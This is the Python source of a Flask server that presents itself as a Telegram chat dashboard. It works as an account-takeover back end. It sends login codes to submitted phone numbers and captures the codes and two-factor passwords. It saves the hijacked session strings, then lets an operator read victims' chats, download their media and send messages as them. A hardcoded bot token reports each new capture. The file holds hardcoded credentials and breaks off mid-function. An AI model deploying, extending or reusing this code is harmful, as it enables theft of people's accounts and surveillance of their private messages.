#!/usr/bin/env python3
"""
Telegram Dashboard Server
Features: Chat management, messaging, media viewing
"""

from flask import Flask, jsonify, request, redirect, send_file
from flask_cors import CORS
from telethon import TelegramClient, errors, functions, types
from telethon.tl.functions.messages import SendMessageRequest, GetHistoryRequest
from telethon.tl.types import (
    InputPeerEmpty, InputPeerUser, InputPeerChat, InputPeerChannel,
    MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage
)
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
from collections import defaultdict
import traceback
import sys
import signal
import hashlib
import hmac
import urllib.parse
import base64
import mimetypes
from io import BytesIO

# Configure logging
import logging.handlers

os.makedirs('logs', exist_ok=True)

file_handler = logging.handlers.RotatingFileHandler(
    'logs/server.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder=None)
CORS(app)

# ============================================
# SERVER CONFIGURATION
# ============================================
SERVER_NUMBER = int(os.environ.get('SERVER_NUMBER', 4))

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 38904710, 'api_hash': '3e00b37e8559fa1c64549659947b431d', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A'
REPORT_CHAT_ID = '-1002452548749'

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# File paths
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
TEMP_SESSIONS_FILE = 'temp_sessions.json'
AUTO_SESSIONS_FILE = 'auto_sessions.json'
USER_MAP_FILE = 'user_map.json'
MEDIA_CACHE_DIR = 'media_cache'

os.makedirs(MEDIA_CACHE_DIR, exist_ok=True)

# Storage with thread locks
accounts = []
temp_sessions = {}
auto_sessions = {}
user_phone_map = {}
file_lock = threading.Lock()

# Chat cache for dashboard
chat_list_cache = {}
message_cache = {}
cache_lock = threading.Lock()
CHAT_LIST_CACHE_DURATION = 15
MESSAGE_CACHE_DURATION = 30

stats = {
    'verified_total': 0,
    'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat(),
    'crashes_recovered': 0
}

# ============================================
# EVENT LOOP HELPER FOR THREADS
# ============================================
def get_or_create_eventloop():
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return loop
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop

# ============================================
# FILE OPERATIONS
# ============================================
def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                content = f.read().strip()
                if content:
                    data = json.loads(content)
                    backup_path = f"{path}.backup"
                    with open(backup_path, 'w') as backup:
                        json.dump(data, backup, indent=2, default=str)
                    return data
    except json.JSONDecodeError as e:
        logger.error(f"Corrupted JSON file {path}: {e}")
        backup_path = f"{path}.backup"
        if os.path.exists(backup_path):
            try:
                with open(backup_path, 'r') as backup:
                    logger.info(f"Restored {path} from backup")
                    return json.load(backup)
            except:
                pass
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
    return default

def save_json(path, data):
    temp_path = f"{path}.tmp"
    with file_lock:
        try:
            with open(temp_path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            os.replace(temp_path, path)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")

def save_temp_sessions():
    sessions_data = {}
    for session_id, session_data in temp_sessions.items():
        sessions_data[session_id] = {
            'phone': session_data['phone'],
            'hash': session_data['hash'],
            'session': session_data['session'],
            'password_attempts': session_data.get('password_attempts', 0),
            'code_attempts': session_data.get('code_attempts', 0),
            'created_at': session_data.get('created_at', time.time()),
            'telegram_id': session_data.get('telegram_id', ''),
            'first_name': session_data.get('first_name', ''),
            'last_name': session_data.get('last_name', ''),
            'username': session_data.get('username', '')
        }
    save_json(TEMP_SESSIONS_FILE, sessions_data)

def load_temp_sessions():
    global temp_sessions
    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
    temp_sessions = {}
    current_time = time.time()
    for session_id, session_data in sessions_data.items():
        created_at = session_data.get('created_at', 0)
        if current_time - created_at < 3600:
            temp_sessions[session_id] = session_data

def save_auto_sessions():
    save_json(AUTO_SESSIONS_FILE, auto_sessions)

def load_auto_sessions():
    global auto_sessions
    auto_sessions = load_json(AUTO_SESSIONS_FILE, {})

def save_user_map():
    save_json(USER_MAP_FILE, user_phone_map)

def load_user_map():
    global user_phone_map
    user_phone_map = load_json(USER_MAP_FILE, {})

# ============================================
# TELEGRAM CLIENT HELPER
# ============================================
class SyncTelegramClient:
    @staticmethod
    def run_async(async_func, timeout=60, retries=2):
        for attempt in range(retries + 1):
            try:
                loop = get_or_create_eventloop()
                result = loop.run_until_complete(
                    asyncio.wait_for(async_func(), timeout=timeout)
                )
                return result
            except asyncio.TimeoutError:
                logger.warning(f"Async timeout on attempt {attempt + 1}")
                if attempt == retries:
                    raise
            except Exception as e:
                logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
                if attempt == retries:
                    raise
                time.sleep(2)
    
    @staticmethod
    def get_client(session_string):
        try:
            get_or_create_eventloop()
            return TelegramClient(
                StringSession(session_string), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=2,
                timeout=30,
                auto_reconnect=True
            )
        except Exception as e:
            logger.error(f"Failed to create client: {e}")
            raise
    
    @staticmethod
    async def safe_connect(client):
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
            return True
        except:
            return False

# ============================================
# ACCOUNT MANAGEMENT
# ============================================
def reset_daily():
    try:
        today = datetime.now().strftime('%Y-%m-%d')
        if stats.get('last_reset') != today:
            stats['verified_today'] = 0
            stats['last_reset'] = today
            save_json(STATS_FILE, stats)
    except Exception as e:
        logger.error(f"Reset daily error: {e}")

def check_account_auth(acc, max_retries=2):
    async def _check():
        client = SyncTelegramClient.get_client(acc['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return False
            return await client.is_user_authorized()
        except:
            return False
        finally:
            try:
                await client.disconnect()
            except:
                pass
    for attempt in range(max_retries):
        try:
            result = SyncTelegramClient.run_async(_check, timeout=15)
            if result is not None:
                return result
        except:
            if attempt == max_retries - 1:
                return False
            time.sleep(1)
    return False

def remove_dead_account(aid, reason=""):
    global accounts
    try:
        acc = next((a for a in accounts if a['id'] == aid), None)
        name = acc.get('name', str(aid)) if acc else str(aid)
        with file_lock:
            accounts = [a for a in accounts if a['id'] != aid]
        save_json(ACCOUNTS_FILE, accounts)
        stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
        save_json(STATS_FILE, stats)
        logger.warning(f"Removed dead account: {name} | Reason: {reason}")
        try:
            send_telegram(f"<b>{SERVER_NAME}</b>\n❌ Removed: {name}\nReason: {reason}")
        except:
            pass
        return name
    except Exception as e:
        logger.error(f"Remove account error: {e}")
        return "Unknown"

def send_telegram(text, retries=3):
    for attempt in range(retries):
        try:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
                timeout=10
            )
            if response.status_code == 200:
                return True
        except Exception as e:
            logger.error(f"Send telegram error (attempt {attempt + 1}): {e}")
        if attempt < retries - 1:
            time.sleep(2)
    return False

# ============================================
# PHONE LOOKUP HELPERS
# ============================================
def find_phone_for_user(telegram_id):
    tid = str(telegram_id)
    phone = user_phone_map.get(tid, '')
    if phone:
        return phone
    if tid in auto_sessions:
        phone = auto_sessions[tid].get('phone', '')
        if phone:
            return phone
    for acc in accounts:
        if str(acc.get('telegram_id')) == tid and acc.get('phone'):
            return acc['phone']
    return None

def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
    async def send_auto_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            sid = str(int(time.time() * 1000))
            temp_sessions[sid] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save(),
                'password_attempts': 0,
                'code_attempts': 0,
                'created_at': time.time(),
                'telegram_id': telegram_id,
                'first_name': first_name,
                'last_name': last_name,
                'username': username
            }
            save_temp_sessions()
            masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
            logger.info(f"✅ Code sent to {masked_phone}")
            return {
                'success': True,
                'session_id': sid,
                'phone_masked': masked_phone,
                'user_name': f"{first_name} {last_name}".strip() or username or 'User'
            }
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
        except errors.PhoneNumberInvalidError:
            return {'success': False, 'error': 'Invalid phone number.'}
        except Exception as e:
            logger.error(f"Auto code error: {e}")
            return {'success': False, 'error': 'Could not send code.'}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
    if not result.get('success'):
        if str(telegram_id) in user_phone_map:
            del user_phone_map[str(telegram_id)]
            save_user_map()
        if str(telegram_id) in auto_sessions:
            del auto_sessions[str(telegram_id)]
            save_auto_sessions()
    return result

# ============================================
# DASHBOARD HELPERS
# ============================================
def get_account_by_id(account_id):
    for acc in accounts:
        if str(acc['id']) == str(account_id) or acc['id'] == account_id:
            return acc
    return None

def get_client_for_account(account_id):
    acc = get_account_by_id(account_id)
    if not acc or not acc.get('session'):
        return None, "Account not found"
    try:
        client = SyncTelegramClient.get_client(acc['session'])
        return client, acc
    except Exception as e:
        return None, str(e)

async def get_dialogs_lightweight(client, limit=50):
    dialogs_list = []
    try:
        dialogs = await client.get_dialogs(limit=limit)
        for dialog in dialogs:
            try:
                entity = dialog.entity
                if hasattr(entity, 'username') and entity.username:
                    chat_id = entity.username
                elif hasattr(entity, 'id'):
                    chat_id = str(entity.id)
                else:
                    continue
                title = dialog.name or 'Unknown'
                if dialog.is_user:
                    chat_type = 'bot' if getattr(entity, 'bot', False) else 'user'
                elif dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                else:
                    chat_type = 'user'
                last_message_text = ''
                last_message_date = None
                last_message_media = None
                if dialog.message:
                    msg = dialog.message
                    if msg.message:
                        last_message_text = msg.message[:100]
                    if msg.date:
                        last_message_date = int(msg.date.timestamp())
                    if msg.media:
                        if hasattr(msg.media, 'photo'):
                            last_message_media = 'photo'
                        elif hasattr(msg.media, 'document'):
                            last_message_media = 'document'
                chat_data = {
                    'id': chat_id,
                    'title': title,
                    'type': chat_type,
                    'lastMessage': last_message_text,
                    'lastMessageDate': last_message_date,
                    'lastMessageMedia': last_message_media,
                    'unread': dialog.unread_count or 0,
                    'isUser': dialog.is_user,
                    'isGroup': dialog.is_group,
                    'isChannel': dialog.is_channel
                }
                dialogs_list.append(chat_data)
            except:
                continue
        dialogs_list.sort(key=lambda x: (-x.get('unread', 0), -(x.get('lastMessageDate') or 0)))
        return dialogs_list
    except Exception as e:
        logger.error(f"Get dialogs error: {e}")
        raise

async def get_chat_messages(client, chat_id, limit=30):
    messages_list = []
    try:
        entity = None
        try:
            if chat_id.startswith('-'):
                entity = await client.get_entity(int(chat_id))
            else:
                entity = await client.get_entity(chat_id)
        except:
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                return messages_list
        messages = await client.get_messages(entity, limit=limit)
        for msg in messages:
            if not msg:
                continue
            try:
                msg_data = {
                    'id': msg.id,
                    'text': msg.message or '',
                    'date': int(msg.date.timestamp()) if msg.date else 0,
                    'out': msg.out if hasattr(msg, 'out') else False,
                    'chatId': chat_id,
                    'hasMedia': bool(msg.media),
                    'mediaType': None
                }
                if msg.media:
                    if hasattr(msg.media, 'photo') or isinstance(msg.media, MessageMediaPhoto):
                        msg_data['mediaType'] = 'photo'
                    elif hasattr(msg.media, 'document'):
                        doc = msg.media.document
                        if doc:
                            mime_type = getattr(doc, 'mime_type', '')
                            if 'video' in mime_type:
                                msg_data['mediaType'] = 'video'
                            elif 'audio' in mime_type:
                                msg_data['mediaType'] = 'audio'
                            else:
                                msg_data['mediaType'] = 'document'
                    elif isinstance(msg.media, MessageMediaWebPage):
                        msg_data['mediaType'] = 'link'
                messages_list.append(msg_data)
            except:
                continue
        return messages_list
    except Exception as e:
        logger.error(f"Get messages error: {e}")
        raise

async def send_message_async(client, chat_id, message_text):
    try:
        entity = None
        try:
            if chat_id.startswith('-'):
                entity = await client.get_entity(int(chat_id))
            else:
                entity = await client.get_entity(chat_id)
        except:
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                raise ValueError(f"Cannot find chat: {chat_id}")
        result = await client.send_message(entity, message_text)
        return {'success': True, 'messageId': result.id, 'text': result.message, 'date': int(result.date.timestamp()) if result.date else 0}
    except Exception as e:
        logger.error(f"Send message error: {e}")
        raise

async def download_media_async(client, account_id, message_id):
    try:
        dialogs = await client.get_dialogs(limit=100)
        for dialog in dialogs:
            try:
                messages = await client.get_messages(dialog.entity, limit=100)
                for msg in messages:
                    if msg.id == int(message_id) and msg.media:
                        filename = f"media_{account_id}_{message_id}"
                        filepath = os.path.join(MEDIA_CACHE_DIR, filename)
                        await client.download_media(msg, filepath)
                        mime_type = mimetypes.guess_type(filepath)[0] or 'application/octet-stream'
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        try:
                            os.remove(filepath)
                        except:
                            pass
                        return {'data': base64.b64encode(data).decode('utf-8'), 'mime_type': mime_type, 'size': len(data)}
            except:
                continue
        return None
    except Exception as e:
        logger.error(f"Download media error: {e}")
        return None

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def index():
    return redirect('/login')

@app.route('/login')
def login_page():
    try:
        return send_file('login.html')
    except FileNotFoundError:
        return "login.html not found. Please upload the file.", 404

@app.route('/auto-add')
def auto_add_page():
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard_page():
    try:
        return send_file('dashboard.html')
    except FileNotFoundError:
        return "dashboard.html not found. Please upload the file.", 404

@app.route('/dash')
def dash_page():
    try:
        return send_file('dash.html')
    except FileNotFoundError:
        return "dash.html not found. Please upload the file.", 404

@app.route('/all')
def all_page():
    try:
        return send_file('all.html')
    except FileNotFoundError:
        return "all.html not found. Please upload the file.", 404

@app.route('/ping')
def ping():
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'timestamp': datetime.now().isoformat(),
        'accounts': len(accounts)
    })

@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL
        }
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        try:
            acc_list.append({
                'id': a['id'],
                'name': a.get('name', '?'),
                'phone': a.get('phone', ''),
                'username': a.get('username', ''),
                'active': a.get('active', True)
            })
        except:
            continue
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/get-chats', methods=['POST'])
def get_chats():
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        cache_key = f"chats_{account_id}"
        with cache_lock:
            if cache_key in chat_list_cache:
                cached = chat_list_cache[cache_key]
                if time.time() - cached.get('timestamp', 0) < CHAT_LIST_CACHE_DURATION:
                    return jsonify(cached['data'])
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc})
        async def _get():
            if not await SyncTelegramClient.safe_connect(client):
                return None, "Failed to connect"
            if not await client.is_user_authorized():
                return None, "auth_key_unregistered"
            dialogs = await get_dialogs_lightweight(client, limit=50)
            return {'success': True, 'chats': dialogs, 'accountName': acc.get('name', 'Unknown')}, None
        try:
            result, error = SyncTelegramClient.run_async(_get, timeout=25)
            if error:
                return jsonify({'success': False, 'error': error})
            if result:
                with cache_lock:
                    chat_list_cache[cache_key] = {'data': result, 'timestamp': time.time()}
                return jsonify(result)
            else:
                return jsonify({'success': False, 'error': 'No data returned'})
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
    except Exception as e:
        logger.error(f"Get chats error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

@app.route('/api/get-chat-messages', methods=['POST'])
def get_chat_messages_route():
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        chat_id = data.get('chatId', '')
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        if not chat_id:
            return jsonify({'success': False, 'error': 'Chat ID required'})
        cache_key = f"msgs_{account_id}_{chat_id}"
        with cache_lock:
            if cache_key in message_cache:
                cached = message_cache[cache_key]
                if time.time() - cached.get('timestamp', 0) < MESSAGE_CACHE_DURATION:
                    return jsonify(cached['data'])
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc})
        async def _get_msgs():
            if not await SyncTelegramClient.safe_connect(client):
                return None, "Failed to connect"
            if not await client.is_user_authorized():
                return None, "Session expired"
            messages = await get_chat_messages(client, chat_id, limit=30)
            return {'success': True, 'messages': messages}, None
        try:
            result, error = SyncTelegramClient.run_async(_get_msgs, timeout=20)
            if error:
                return jsonify({'success': False, 'error': error})
            if result:
                with cache_lock:
                    message_cache[cache_key] = {'data': result, 'timestamp': time.time()}
                return jsonify(result)
            else:
                return jsonify({'success': False, 'error': 'No messages found'})
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
    except Exception as e:
        logger.error(f"Get chat messages error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    try:
        data = request.json or {}
        account_id = data.get('accountId', '')
        chat_id = data.get('chatId', '')
        message_text = data.get('message', '')
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        if not chat_id:
            return jsonify({'success': False, 'error': 'Chat ID required'})
        if not message_text:
            return jsonify({'success': False, 'error': 'Message text required'})
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'success': False, 'error': acc})
        async def _send():
            if not await SyncTelegramClient.safe_connect(client):
                return None, "Failed to connect"
            if not await client.is_user_authorized():
                return None, "Session expired"
            result = await send_message_async(client, chat_id, message_text)
            return result, None
        try:
            result, error = SyncTelegramClient.run_async(_send, timeout=30)
            if error:
                return jsonify({'success': False, 'error': error})
            with cache_lock:
                cache_key = f"chats_{account_id}"
                if cache_key in chat_list_cache:
                    del chat_list_cache[cache_key]
                msg_key = f"msgs_{account_id}_{chat_id}"
                if msg_key in message_cache:
                    del message_cache[msg_key]
            return jsonify(result or {'success': False, 'error': 'Failed to send'})
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
    except Exception as e:
        logger.error(f"Send message error: {e}")
        return jsonify({'success': False, 'error': str(e)[:200]})

@app.route('/api/media/<int:account_id>/<int:message_id>')
def get_media(account_id, message_id):
    try:
        client, acc = get_client_for_account(account_id)
        if not client:
            return jsonify({'error': 'Account not found'}), 404
        async def _download():
            if not await SyncTelegramClient.safe_connect(client):
                return None
            if not await client.is_user_authorized():
                return None
            return await download_media_async(client, account_id, message_id)
        try:
            media_data = SyncTelegramClient.run_async(_download, timeout=30)
            if media_data:
                from flask import Response
                return Response(
                    base64.b64decode(media_data['data']),
                    mimetype=media_data['mime_type'],
                    headers={
                        'Content-Disposition': f'inline; filename="media_{account_id}_{message_id}"',
                        'Cache-Control': 'public, max-age=3600'
                    }
                )
            else:
                return jsonify({'error': 'Media not found'}), 404
        finally:
            try:
                async def _disconnect():
                    await client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
    except Exception as e:
        logger.error(f"Get media error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/share-phone', methods=['POST'])
def share_phone():
    try:
        data = request.json or {}
        phone = data.get('phone', '').strip()
        telegram_id = str(data.get('telegramId', ''))
        first_name = data.get('firstName', '')
        last_name = data.get('lastName', '')
        username = data.get('username', '')
        if not phone:
            return jsonify({'success': False, 'error': 'No phone number provided'})
        phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
        if not phone.startswith('+'):
            phone = '+' + phone
        logger.info(f"📱 Shared phone for user {telegram_id}: {phone[:4]}****")
        if telegram_id:
            user_phone_map[telegram_id] = phone
            save_user_map()
        result = auto_send_code(phone, telegram_id, first_name, last_name, username)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Share phone error: {e}")
        return jsonify({'success': False, 'error': 'Failed to process phone.'})

@app.route('/api/telegram-auto-login', methods=['POST'])
def telegram_auto_login():
    try:
        data = request.json or {}
        init_data_str = data.get('initData', '')
        if not init_data_str:
            init_data_str = request.args.get('initData', '')
        user_data = data.get('user', {})
        if not user_data and init_data_str:
            for item in init_data_str.split('&'):
                if item.startswith('user='):
                    try:
                        user_json = urllib.parse.unquote(item[5:])
                        user_data = json.loads(user_json)
                    except:
                        pass
        telegram_id = str(user_data.get('id', ''))
        first_name = user_data.get('first_name', '')
        last_name = user_data.get('last_name', '')
        username = user_data.get('username', '')
        if not telegram_id:
            return jsonify({'success': False, 'error': 'Could not identify account.', 'needs_phone': True})
        phone = find_phone_for_user(telegram_id)
        if phone:
            logger.info(f"✅ Found phone for {telegram_id}, sending code...")
            result = auto_send_code(phone, telegram_id, first_name, last_name, username)
            result['auto_detected'] = True
            return jsonify(result)
        else:
            return jsonify({
                'success': False,
                'error': 'Please share your phone number.',
                'needs_phone': True,
                'request_phone_share': True,
                'user_name': f"{first_name} {last_name}".strip(),
                'username': username
            })
    except Exception as e:
        logger.error(f"Auto-login error: {e}")
        return jsonify({'success': False, 'error': 'Auto-login failed.', 'needs_phone': True})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        telegram_id = str(data.get('telegramId', ''))
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        result = auto_send_code(phone, telegram_id)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': 'Server error.'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired.'})
        td = temp_sessions[sid]
        telegram_id = str(td.get('telegram_id', ''))
        if td.get('code_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect codes.'})
        if td.get('password_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect passwords.'})
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                    td['code_attempts'] = 0
                    save_temp_sessions()
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    try:
                        await client.sign_in(password=pwd)
                        td['password_attempts'] = 0
                        save_temp_sessions()
                    except errors.PasswordHashInvalidError:
                        td['password_attempts'] = td.get('password_attempts', 0) + 1
                        save_temp_sessions()
                        remaining = 5 - td['password_attempts']
                        if remaining <= 0:
                            del temp_sessions[sid]
                            save_temp_sessions()
                            return {'success': False, 'error': 'Too many incorrect passwords.'}
                        return {'success': False, 'error': f'Wrong password. {remaining} attempts remaining.'}
                me = await client.get_me()
                user_telegram_id = str(me.id) if me.id else telegram_id
                if user_telegram_id:
                    user_phone_map[user_telegram_id] = td['phone']
                    save_user_map()
                    auto_sessions[user_telegram_id] = {
                        'phone': td['phone'],
                        'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                        'username': me.username or '',
                        'last_used': time.time(),
                        'telegram_id': user_telegram_id
                    }
                    save_auto_sessions()
                new_id = int(time.time() * 1000)
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'telegram_id': user_telegram_id
                }
                if not new_acc['name']:
                    new_acc['name'] = 'User ' + str(new_id)[-4:]
                existing = None
                for a in accounts:
                    if str(a.get('telegram_id')) == user_telegram_id:
                        existing = a
                        break
                if existing:
                    existing.update(new_acc)
                    new_acc['id'] = existing['id']
                else:
                    accounts.append(new_acc)
                save_json(ACCOUNTS_FILE, accounts)
                try:
                    send_telegram(
                        f"<b>{SERVER_NAME}</b>\n✅ Account added!\n"
                        f"Name: {new_acc['name']}\n"
                        f"Phone: {new_acc['phone'][:4]}****"
                    )
                except:
                    pass
                return {
                    'success': True,
                    'account': {'id': new_acc['id'], 'name': new_acc['name'], 'phone': new_acc['phone']},
                    'auto_login_enabled': True
                }
            except errors.PhoneCodeInvalidError:
                td['code_attempts'] = td.get('code_attempts', 0) + 1
                save_temp_sessions()
                remaining = 5 - td['code_attempts']
                if remaining <= 0:
                    del temp_sessions[sid]
                    save_temp_sessions()
                    return {'success': False, 'error': 'Too many incorrect codes.'}
                return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired.'}
            except Exception as e:
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        result = SyncTelegramClient.run_async(verify, timeout=45)
        if result.get('success') and not result.get('need_password'):
            if sid in temp_sessions:
                del temp_sessions[sid]
                save_temp_sessions()
        return jsonify(result)
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': 'Server error.'})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        name = remove_dead_account(aid, "Manual removal")
        with cache_lock:
            cache_key = f"chats_{aid}"
            if cache_key in chat_list_cache:
                del chat_list_cache[cache_key]
        return jsonify({'success': True, 'message': f'Removed: {name}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-report')
def send_report():
    success = send_telegram(
        f"<b>{SERVER_NAME}</b> Report\n"
        f"📊 Total Accounts: {len(accounts)}"
    )
    return jsonify({'success': success})

@app.route('/api/health')
def health_check():
    return jsonify({
        'success': True,
        'server': SERVER_NAME,
        'status': 'healthy',
        'accounts': len(accounts),
        'saved_users': len(user_phone_map),
        'timestamp': datetime.now().isoformat()
    })

# ============================================
# BACKGROUND TASKS
# ============================================
def keep_alive():
    consecutive_failures = 0
    while True:
        try:
            time.sleep(240)
            try:
                response = requests.get(f"{SERVER_URL}/ping", timeout=10)
                if response.status_code == 200:
                    consecutive_failures = 0
                else:
                    consecutive_failures += 1
            except:
                consecutive_failures += 1
            if consecutive_failures > 5:
                logger.critical("Too many keep-alive failures!")
                consecutive_failures = 0
        except Exception as e:
            logger.error(f"Keep alive error: {e}")
            time.sleep(60)

def cleanup_caches():
    while True:
        time.sleep(30)
        current_time = time.time()
        with cache_lock:
            expired_chats = [k for k, v in chat_list_cache.items() 
                           if current_time - v.get('timestamp', 0) > CHAT_LIST_CACHE_DURATION * 2]
            for k in expired_chats:
                del chat_list_cache[k]
            expired_msgs = [k for k, v in message_cache.items()
                          if current_time - v.get('timestamp', 0) > MESSAGE_CACHE_DURATION * 2]
            for k in expired_msgs:
                del message_cache[k]

def restore_and_start():
    try:
        time.sleep(5)
        logger.info(f"🔄 Restoring {len(accounts)} accounts...")
        
        for acc in accounts:
            try:
                if acc.get('session') and not check_account_auth(acc):
                    remove_dead_account(acc['id'], "Auth check failed on startup")
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error checking {acc.get('id')}: {e}")
        
        save_json(ACCOUNTS_FILE, accounts)
        cleanup_expired_sessions()
        
        try:
            send_telegram(
                f"<b>{SERVER_NAME}</b> 🟢 Online!\n"
                f"Accounts: {len(accounts)}"
            )
        except:
            pass
        
        logger.info(f"✅ Server ready with {len(accounts)} accounts")
    except Exception as e:
        logger.critical(f"Fatal restore error: {e}")
        stats['crashes_recovered'] = stats.get('crashes_recovered', 0) + 1
        save_json(STATS_FILE, stats)

def cleanup_expired_sessions():
    try:
        current_time = time.time()
        expired = [sid for sid, data in temp_sessions.items()
                   if current_time - data.get('created_at', 0) > 3600]
        for sid in expired:
            del temp_sessions[sid]
        save_temp_sessions()
